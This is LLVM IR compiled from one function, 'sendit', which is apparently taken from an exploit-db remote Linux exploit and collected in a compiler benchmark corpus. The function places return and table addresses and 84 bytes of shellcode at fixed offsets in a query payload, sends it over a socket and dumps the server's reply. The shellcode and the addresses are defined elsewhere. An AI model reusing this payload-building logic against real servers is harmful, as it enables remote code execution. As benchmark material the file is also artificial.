; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1741.c_sendit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1741.c_sendit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@d = common dso_local global i32 0, align 4
@tmp_idx = common dso_local global i32 0, align 4
@tbl = common dso_local global i32 0, align 4
@addr_ret = common dso_local global i8* null, align 8
@thd = common dso_local global i32 0, align 4
@addr_tdh = common dso_local global i8* null, align 8
@addr_tbl = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"ret %x\0A\00", align 1
@THD_POS = common dso_local global i32 0, align 4
@query_payload = common dso_local global i8* null, align 8
@TBL_POS = common dso_local global i32 0, align 4
@RET_POS = common dso_local global i32 0, align 4
@SHL_POS = common dso_local global i32 0, align 4
@shcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [7 x i8] c"entro\0A\00", align 1
@payload_len = common dso_local global i32 0, align 4
@table_dump_packet = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@dump_packet_len = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [19 x i8] c"\0AClient -> Server\0A\00", align 1
@hexdump = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [8 x i8] c" %.2x%c\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c" %.2c%2c\00", align 1
@fd = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [16 x i8] c"cli: send(buf3)\00", align 1
@buf = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [19 x i8] c"\0AServer -> Client\0A\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"\0A%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @sendit(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %15 = load i32, i32* @d, align 4
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i32 %15)
  %17 = load i32, i32* @d, align 4
  %18 = icmp eq i32 %17, 2
  br i1 %18, label %19, label %166

19:                                               ; preds = %3
  store i32 14, i32* %11, align 4
  store i32 3, i32* @tmp_idx, align 4
  %20 = load i32, i32* @tbl, align 4
  %21 = sub nsw i32 %20, 262
  %22 = add nsw i32 %21, 33
  store i32 %22, i32* %12, align 4
  store i32 0, i32* %8, align 4
  br label %23

23:                                               ; preds = %37, %19
  %24 = load i32, i32* %8, align 4
  %25 = icmp slt i32 %24, 32
  br i1 %25, label %26, label %40

26:                                               ; preds = %23
  %27 = load i32, i32* %12, align 4
  %28 = load i32, i32* %8, align 4
  %29 = ashr i32 %27, %28
  %30 = and i32 %29, 255
  %31 = trunc i32 %30 to i8
  %32 = load i8*, i8** @addr_ret, align 8
  %33 = load i32, i32* @tmp_idx, align 4
  %34 = add nsw i32 %33, -1
  store i32 %34, i32* @tmp_idx, align 4
  %35 = sext i32 %33 to i64
  %36 = getelementptr inbounds i8, i8* %32, i64 %35
  store i8 %31, i8* %36, align 1
  br label %37

37:                                               ; preds = %26
  %38 = load i32, i32* %8, align 4
  %39 = add nsw i32 %38, 8
  store i32 %39, i32* %8, align 4
  br label %23

40:                                               ; preds = %23
  store i32 3, i32* @tmp_idx, align 4
  store i32 0, i32* %8, align 4
  br label %41

41:                                               ; preds = %55, %40
  %42 = load i32, i32* %8, align 4
  %43 = icmp slt i32 %42, 32
  br i1 %43, label %44, label %58

44:                                               ; preds = %41
  %45 = load i32, i32* @thd, align 4
  %46 = load i32, i32* %8, align 4
  %47 = ashr i32 %45, %46
  %48 = and i32 %47, 255
  %49 = trunc i32 %48 to i8
  %50 = load i8*, i8** @addr_tdh, align 8
  %51 = load i32, i32* @tmp_idx, align 4
  %52 = add nsw i32 %51, -1
  store i32 %52, i32* @tmp_idx, align 4
  %53 = sext i32 %51 to i64
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  store i8 %49, i8* %54, align 1
  br label %55

55:                                               ; preds = %44
  %56 = load i32, i32* %8, align 4
  %57 = add nsw i32 %56, 8
  store i32 %57, i32* %8, align 4
  br label %41

58:                                               ; preds = %41
  store i32 3, i32* @tmp_idx, align 4
  store i32 0, i32* %8, align 4
  br label %59

59:                                               ; preds = %73, %58
  %60 = load i32, i32* %8, align 4
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %62, label %76

62:                                               ; preds = %59
  %63 = load i32, i32* @tbl, align 4
  %64 = load i32, i32* %8, align 4
  %65 = ashr i32 %63, %64
  %66 = and i32 %65, 255
  %67 = trunc i32 %66 to i8
  %68 = load i8*, i8** @addr_tbl, align 8
  %69 = load i32, i32* @tmp_idx, align 4
  %70 = add nsw i32 %69, -1
  store i32 %70, i32* @tmp_idx, align 4
  %71 = sext i32 %69 to i64
  %72 = getelementptr inbounds i8, i8* %68, i64 %71
  store i8 %67, i8* %72, align 1
  br label %73

73:                                               ; preds = %62
  %74 = load i32, i32* %8, align 4
  %75 = add nsw i32 %74, 8
  store i32 %75, i32* %8, align 4
  br label %59

76:                                               ; preds = %59
  %77 = load i32, i32* %12, align 4
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i32 %77)
  store i32 0, i32* @tmp_idx, align 4
  %79 = load i32, i32* @THD_POS, align 4
  store i32 %79, i32* %10, align 4
  br label %80

80:                                               ; preds = %96, %76
  %81 = load i32, i32* %10, align 4
  %82 = load i32, i32* @THD_POS, align 4
  %83 = sub nsw i32 %82, 4
  %84 = icmp sgt i32 %81, %83
  br i1 %84, label %85, label %99

85:                                               ; preds = %80
  %86 = load i8*, i8** @addr_tdh, align 8
  %87 = load i32, i32* @tmp_idx, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* @tmp_idx, align 4
  %89 = sext i32 %87 to i64
  %90 = getelementptr inbounds i8, i8* %86, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = load i8*, i8** @query_payload, align 8
  %93 = load i32, i32* %10, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  store i8 %91, i8* %95, align 1
  br label %96

96:                                               ; preds = %85
  %97 = load i32, i32* %10, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %10, align 4
  br label %80

99:                                               ; preds = %80
  store i32 0, i32* @tmp_idx, align 4
  %100 = load i32, i32* @TBL_POS, align 4
  store i32 %100, i32* %10, align 4
  br label %101

101:                                              ; preds = %117, %99
  %102 = load i32, i32* %10, align 4
  %103 = load i32, i32* @TBL_POS, align 4
  %104 = sub nsw i32 %103, 4
  %105 = icmp sgt i32 %102, %104
  br i1 %105, label %106, label %120

106:                                              ; preds = %101
  %107 = load i8*, i8** @addr_tbl, align 8
  %108 = load i32, i32* @tmp_idx, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* @tmp_idx, align 4
  %110 = sext i32 %108 to i64
  %111 = getelementptr inbounds i8, i8* %107, i64 %110
  %112 = load i8, i8* %111, align 1
  %113 = load i8*, i8** @query_payload, align 8
  %114 = load i32, i32* %10, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %113, i64 %115
  store i8 %112, i8* %116, align 1
  br label %117

117:                                              ; preds = %106
  %118 = load i32, i32* %10, align 4
  %119 = add nsw i32 %118, -1
  store i32 %119, i32* %10, align 4
  br label %101

120:                                              ; preds = %101
  store i32 0, i32* @tmp_idx, align 4
  %121 = load i32, i32* @RET_POS, align 4
  store i32 %121, i32* %10, align 4
  br label %122

122:                                              ; preds = %138, %120
  %123 = load i32, i32* %10, align 4
  %124 = load i32, i32* @RET_POS, align 4
  %125 = sub nsw i32 %124, 4
  %126 = icmp sgt i32 %123, %125
  br i1 %126, label %127, label %141

127:                                              ; preds = %122
  %128 = load i8*, i8** @addr_ret, align 8
  %129 = load i32, i32* @tmp_idx, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* @tmp_idx, align 4
  %131 = sext i32 %129 to i64
  %132 = getelementptr inbounds i8, i8* %128, i64 %131
  %133 = load i8, i8* %132, align 1
  %134 = load i8*, i8** @query_payload, align 8
  %135 = load i32, i32* %10, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  store i8 %133, i8* %137, align 1
  br label %138

138:                                              ; preds = %127
  %139 = load i32, i32* %10, align 4
  %140 = add nsw i32 %139, -1
  store i32 %140, i32* %10, align 4
  br label %122

141:                                              ; preds = %122
  store i32 0, i32* @tmp_idx, align 4
  %142 = load i32, i32* @SHL_POS, align 4
  store i32 %142, i32* %10, align 4
  br label %143

143:                                              ; preds = %159, %141
  %144 = load i32, i32* %10, align 4
  %145 = load i32, i32* @SHL_POS, align 4
  %146 = add nsw i32 %145, 84
  %147 = icmp slt i32 %144, %146
  br i1 %147, label %148, label %162

148:                                              ; preds = %143
  %149 = load i8*, i8** @shcode, align 8
  %150 = load i32, i32* @tmp_idx, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* @tmp_idx, align 4
  %152 = sext i32 %150 to i64
  %153 = getelementptr inbounds i8, i8* %149, i64 %152
  %154 = load i8, i8* %153, align 1
  %155 = load i8*, i8** @query_payload, align 8
  %156 = load i32, i32* %10, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i8, i8* %155, i64 %157
  store i8 %154, i8* %158, align 1
  br label %159

159:                                              ; preds = %148
  %160 = load i32, i32* %10, align 4
  %161 = add nsw i32 %160, 1
  store i32 %161, i32* %10, align 4
  br label %143

162:                                              ; preds = %143
  %163 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %164 = load i8*, i8** @query_payload, align 8
  store i8* %164, i8** %4, align 8
  %165 = load i32, i32* @payload_len, align 4
  store i32 %165, i32* %7, align 4
  br label %186

166:                                              ; preds = %3
  %167 = load i32, i32* @d, align 4
  %168 = icmp sge i32 %167, 3
  br i1 %168, label %169, label %185

169:                                              ; preds = %166
  %170 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %171 = load i8*, i8** @table_dump_packet, align 8
  store i8* %171, i8** %4, align 8
  %172 = load i32, i32* %6, align 4
  %173 = icmp sge i32 %172, 0
  br i1 %173, label %174, label %179

174:                                              ; preds = %169
  %175 = load i32, i32* %6, align 4
  %176 = trunc i32 %175 to i8
  %177 = load i8*, i8** %4, align 8
  %178 = getelementptr inbounds i8, i8* %177, i64 5
  store i8 %176, i8* %178, align 1
  br label %179

179:                                              ; preds = %174, %169
  %180 = load i32, i32* %6, align 4
  %181 = trunc i32 %180 to i8
  %182 = sext i8 %181 to i32
  %183 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 %182)
  %184 = load i32, i32* @dump_packet_len, align 4
  store i32 %184, i32* %7, align 4
  br label %185

185:                                              ; preds = %179, %166
  br label %186

186:                                              ; preds = %185, %162
  %187 = load i32, i32* @d, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* @d, align 4
  %189 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  %190 = load i64, i64* @hexdump, align 8
  %191 = icmp ne i64 %190, 0
  br i1 %191, label %192, label %246

192:                                              ; preds = %186
  store i32 0, i32* %8, align 4
  br label %193

193:                                              ; preds = %211, %192
  %194 = load i32, i32* %8, align 4
  %195 = load i32, i32* %7, align 4
  %196 = icmp slt i32 %194, %195
  br i1 %196, label %197, label %214

197:                                              ; preds = %193
  %198 = load i8*, i8** %4, align 8
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i8, i8* %198, i64 %200
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = load i32, i32* %8, align 4
  %205 = add nsw i32 %204, 1
  %206 = srem i32 %205, 16
  %207 = icmp ne i32 %206, 0
  %208 = zext i1 %207 to i64
  %209 = select i1 %207, i32 32, i32 10
  %210 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i32 %203, i32 %209)
  br label %211

211:                                              ; preds = %197
  %212 = load i32, i32* %8, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %8, align 4
  br label %193

214:                                              ; preds = %193
  %215 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  br label %216

216:                                              ; preds = %242, %214
  %217 = load i32, i32* %8, align 4
  %218 = load i32, i32* %7, align 4
  %219 = icmp slt i32 %217, %218
  br i1 %219, label %220, label %245

220:                                              ; preds = %216
  %221 = load i8*, i8** %4, align 8
  %222 = load i32, i32* %8, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds i8, i8* %221, i64 %223
  %225 = load i8, i8* %224, align 1
  store i8 %225, i8* %13, align 1
  %226 = load i8, i8* %13, align 1
  %227 = call i64 @isprint(i8 zeroext %226)
  %228 = icmp ne i64 %227, 0
  br i1 %228, label %229, label %232

229:                                              ; preds = %220
  %230 = load i8, i8* %13, align 1
  %231 = zext i8 %230 to i32
  br label %233

232:                                              ; preds = %220
  br label %233

233:                                              ; preds = %232, %229
  %234 = phi i32 [ %231, %229 ], [ 46, %232 ]
  %235 = load i32, i32* %8, align 4
  %236 = add nsw i32 %235, 1
  %237 = srem i32 %236, 16
  %238 = icmp ne i32 %237, 0
  %239 = zext i1 %238 to i64
  %240 = select i1 %238, i32 32, i32 10
  %241 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i32 %234, i32 %240)
  br label %242

242:                                              ; preds = %233
  %243 = load i32, i32* %8, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %8, align 4
  br label %216

245:                                              ; preds = %216
  br label %246

246:                                              ; preds = %245, %186
  %247 = load i32, i32* @fd, align 4
  %248 = load i8*, i8** %4, align 8
  %249 = load i32, i32* %7, align 4
  %250 = call i32 @send(i32 %247, i8* %248, i32 %249, i32 0)
  %251 = load i32, i32* %7, align 4
  %252 = icmp ne i32 %250, %251
  br i1 %252, label %253, label %256

253:                                              ; preds = %246
  %254 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0))
  %255 = call i32 @exit(i32 1) #3
  unreachable

256:                                              ; preds = %246
  %257 = load i32, i32* @fd, align 4
  store i32 %257, i32* %5, align 4
  %258 = load i8*, i8** @buf, align 8
  %259 = call i32 @memset(i8* %258, i32 0, i32 65535)
  %260 = load i32, i32* %5, align 4
  %261 = load i8*, i8** @buf, align 8
  %262 = call i32 @recv(i32 %260, i8* %261, i32 65535, i32 0)
  store i32 %262, i32* %9, align 4
  %263 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.9, i64 0, i64 0))
  %264 = load i64, i64* @hexdump, align 8
  %265 = icmp ne i64 %264, 0
  br i1 %265, label %266, label %320

266:                                              ; preds = %256
  store i32 0, i32* %8, align 4
  br label %267

267:                                              ; preds = %285, %266
  %268 = load i32, i32* %8, align 4
  %269 = load i32, i32* %9, align 4
  %270 = icmp slt i32 %268, %269
  br i1 %270, label %271, label %288

271:                                              ; preds = %267
  %272 = load i8*, i8** @buf, align 8
  %273 = load i32, i32* %8, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds i8, i8* %272, i64 %274
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = load i32, i32* %8, align 4
  %279 = add nsw i32 %278, 1
  %280 = srem i32 %279, 16
  %281 = icmp ne i32 %280, 0
  %282 = zext i1 %281 to i64
  %283 = select i1 %281, i32 32, i32 10
  %284 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i32 %277, i32 %283)
  br label %285

285:                                              ; preds = %271
  %286 = load i32, i32* %8, align 4
  %287 = add nsw i32 %286, 1
  store i32 %287, i32* %8, align 4
  br label %267

288:                                              ; preds = %267
  %289 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  br label %290

290:                                              ; preds = %316, %288
  %291 = load i32, i32* %8, align 4
  %292 = load i32, i32* %9, align 4
  %293 = icmp slt i32 %291, %292
  br i1 %293, label %294, label %319

294:                                              ; preds = %290
  %295 = load i8*, i8** @buf, align 8
  %296 = load i32, i32* %8, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds i8, i8* %295, i64 %297
  %299 = load i8, i8* %298, align 1
  store i8 %299, i8* %14, align 1
  %300 = load i8, i8* %14, align 1
  %301 = call i64 @isprint(i8 zeroext %300)
  %302 = icmp ne i64 %301, 0
  br i1 %302, label %303, label %306

303:                                              ; preds = %294
  %304 = load i8, i8* %14, align 1
  %305 = zext i8 %304 to i32
  br label %307

306:                                              ; preds = %294
  br label %307

307:                                              ; preds = %306, %303
  %308 = phi i32 [ %305, %303 ], [ 46, %306 ]
  %309 = load i32, i32* %8, align 4
  %310 = add nsw i32 %309, 1
  %311 = srem i32 %310, 16
  %312 = icmp ne i32 %311, 0
  %313 = zext i1 %312 to i64
  %314 = select i1 %312, i32 32, i32 10
  %315 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i32 %308, i32 %314)
  br label %316

316:                                              ; preds = %307
  %317 = load i32, i32* %8, align 4
  %318 = add nsw i32 %317, 1
  store i32 %318, i32* %8, align 4
  br label %290

319:                                              ; preds = %290
  br label %324

320:                                              ; preds = %256
  %321 = load i8*, i8** @buf, align 8
  %322 = getelementptr inbounds i8, i8* %321, i64 5
  %323 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i8* %322)
  br label %324

324:                                              ; preds = %320, %319
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @isprint(i8 zeroext) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
